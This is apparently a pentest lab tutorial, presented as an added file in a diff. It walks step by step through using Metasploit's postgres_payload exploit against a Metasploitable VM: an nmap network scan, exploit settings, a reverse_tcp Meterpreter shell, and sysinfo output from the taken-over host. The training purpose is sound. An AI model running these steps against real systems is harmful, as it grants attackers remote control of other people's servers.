@@ -1,0 +1,79 @@
+01msf
+
+So let’s assume you have your metapsloitable target machine setup and we are in Kali Linux. we know our network range is 10.0.2.xx so first thing to do is run nmap to discover what is on our network and what ports are open.
+
+
+	
+┌──(kali㉿kali)-[~]
+└─$ nmap 10.0.2.0/24
+
+we will see all the machines on our virtual box network, and we should see that our metasploitable machine has lots of services and ports open ready for our attack. Metasploitable is a target machine we can use in our pentest lab to practice and learn about the various vulnerabilities. You will then be able to recognize these on “real targets” later, if they have specific ports or services running, you will already have the knowledge of where to attack.
+
+02msf
+
+In the above we can see that the IP address of our target machine is 10.0.2.6 and all the ports and services that are running. In this case we will try to target the postgresql service on port 5432.
+
+Open up a new terminal window and start msfconsole
+	
+┌──(kali㉿kali)-[~]
+└─$ msfconsole 
+
+Now type search postgresql to see all the available tools in metasploit framework that are related to postgresql.
+
+03msf
+
+In this instance we will use the linux exploit postgres_payload which is number 8 on the list and has an excellent rank, meaning a high chance of success. So type use 8
+
+
+msf6 > use 8
+[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
+msf6 exploit(linux/postgres/postgres_payload) > 
+
+Metasploit will default to use the linux meterpreter payload. now type options to view the settings you need to enter before running the exploit.
+
+04msf
+
+We need to setup the LHOST, LPORT the RHOSTS and the RPORT
+
+LHOST and LPORT is the port and IP address of our Kali Linux machine that will host the service.
+
+RHOSTS and RPORT is our target machine. So go ahead and set these up. The RPORT should be the same port that is open on the postgresql service we found in nmap.
+
+	
+msf6 exploit(linux/postgres/postgres_payload) > set LHOST 10.0.2.15
+LHOST => 10.0.2.15
+msf6 exploit(linux/postgres/postgres_payload) > set LPORT 4444
+LPORT => 4444
+msf6 exploit(linux/postgres/postgres_payload) > set RHOSTS 10.0.2.6
+RHOSTS => 10.0.2.6
+msf6 exploit(linux/postgres/postgres_payload) > set RPORT 5432
+
+run options command again and you will see everything is filled in.
+
+05msf
+
+Now it’s a simple matter of typing exploit and hitting enter.
+1
+	
+msf6 exploit(linux/postgres/postgres_payload) > exploit
+
+You should now be in a meterpreter shell
+
+to confirm type sysinfo to get the details of the system we are now connected to
+1
+2
+3
+4
+5
+6
+7
+	
+meterpreter > sysinfo
+Computer     : metasploitable.localdomain
+OS           : Ubuntu 8.04 (Linux 2.6.24-16-server)
+Architecture : i686
+BuildTuple   : i486-linux-musl
+Meterpreter  : x86/linux
+meterpreter > 
+
+Congratulations, you have successfully exploited the postgresql vulnerability and have control of the system.
